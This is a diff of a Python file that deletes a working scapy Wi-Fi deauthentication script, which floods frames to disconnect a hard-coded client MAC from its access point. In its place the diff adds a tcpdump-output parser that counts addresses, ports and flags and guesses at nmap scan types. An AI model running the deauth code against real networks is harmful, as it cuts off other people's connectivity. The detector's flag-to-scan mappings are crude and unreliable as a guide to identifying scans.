@@ -1,47 +1,90 @@
-from scapy.all import *
-import re, uuid
+import sys
+import os
+import re
 
-def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="Intel(R) Dual Band Wireless-AC 3165", verbose=1):
-    # 802.11 frame
-    # addr1: destination MAC
-    # addr2: source MAC
-    # addr3: Access Point MAC
-    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-    # stack them up
-    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-    # send the packet
-    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)
+sourceip_arr=[]
+destip_arr=[]
+srcport_arr=[]
+destport_arr=[]
 
-if __name__ == "__main__":
-    import argparse
-    parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
-    parser.add_argument("target", help="Target MAC address to deauthenticate.")
-    parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
-    parser.add_argument("-c" , "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0", default=0)
-    parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms", default=0.1)
-    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0mon'", default="wlan0mon")
-    parser.add_argument("-v", "--verbose", help="wether to print messages", action="store_true")
-    
-    #args = parser.parse_args()
-    target = "24:ee:9a:a3:a4:53"
-    gateway = "30:24:32:a8:ec:a1"
-    count = 0
-    interval = 0.1
-    iface = "Intel(R) Dual Band Wireless-AC 3165"
-    verbose = "-v"
-    print ("The MAC address in expressed in formatted and less complex way : ", end="")
-    print (':'.join(re.findall('..', '%012x' % uuid.getnode())))
-    if count == 0:
-        # if count is 0, it means we loop forever (until interrupt)
-        loop = 1
-        count = None
-    else:
-        loop = 0
-    # printing some info messages"
-    if verbose:
-        if count:
-            print(f"[+] Sending {count} frames every {interval}s...")
-        else:
-            print(f"[+] Sending frames every {interval}s for ever...")
+sourceip_dic={}
+destip_dic={}
+srcport_dic={}
+destport_dic={}
+flags_dic={}
 
-    deauth(target, gateway, interval, count, loop, iface, verbose)
+class nmapscan(object):
+	def __init__(self):
+		self.source_ip=None
+		self.dest_ip=None
+		self.source_port=None
+		self.dest_port=None
+		self.flag=None
+		self.syn_dic={}
+		self.linelen=0
+	def extractingdata(self):
+		for line in sys.stdin:
+			line.strip()
+			self.linelen=self.linelen+1
+			self.source_ip = re.findall('^[0-9].*IP\s([0-9]*[.][0-9]*[.][0-9]*[.][0-9]*)[.].*\s>',line)
+			self.dest_ip = re.findall('^[0-9].*>\s([0-9]*[.][0-9]*[.][0-9]*[.][0-9]*)[.][0-9]*',line)
+			self.source_port = re.findall('^[0-9].*IP\s[0-9]*[.][0-9]*[.][0-9]*[.][0-9]*[.]([^ ]*)\s>',line)
+			self.dest_port = re.findall('^[0-9].*>\s[0-9]*[.][0-9]*[.][0-9]*[.][0-9]*[.]([0-9]*):',line)
+			self.flags= re.findall('^[0-9].*Flags\s[[]([^ ]*)[]][,]',line)
+
+			print (self.linelen,self.source_ip,self.dest_ip,self.source_port,self.dest_port)
+			
+			if self.flags:
+				for a in self.flags:
+					if a not in flags_dic:
+						flags_dic[a]=1
+					else:
+						flags_dic[a]+=1
+			
+			if self.dest_ip:
+				for i in self.dest_ip:
+					destip_arr.append(i)
+					
+					if i not in destip_dic:
+						destip_dic[i]=1
+					else:
+						destip_dic[i]+=1
+					
+					
+			if self.source_ip:
+				for j in self.source_ip:
+					sourceip_arr.append(j)
+					
+					if j not in sourceip_dic:
+						sourceip_dic[j]=1
+					else:
+						sourceip_dic[j]+=1
+					
+					
+			if self.source_port:
+				for k in self.source_port:
+					srcport_arr.append(k)
+					
+					if k not in srcport_dic:
+						srcport_dic[k]=1
+					else:
+						srcport_dic[k]+=1
+					
+			if self.dest_port:
+				for l in self.dest_port:
+					destport_arr.append(l)
+					
+					
+					if l not in destport_dic:
+						destport_dic[l]=1
+					else:
+						destport_dic[l]+=1
+			for i in flags_dic:
+				if i == 'R.':
+					print ("NMAP -sX SCAN")
+				if i == 'PSH.':
+					print ("NMAP -sT SCAN")
+
+
+ping=nmapscan()
+ping.extractingdata()
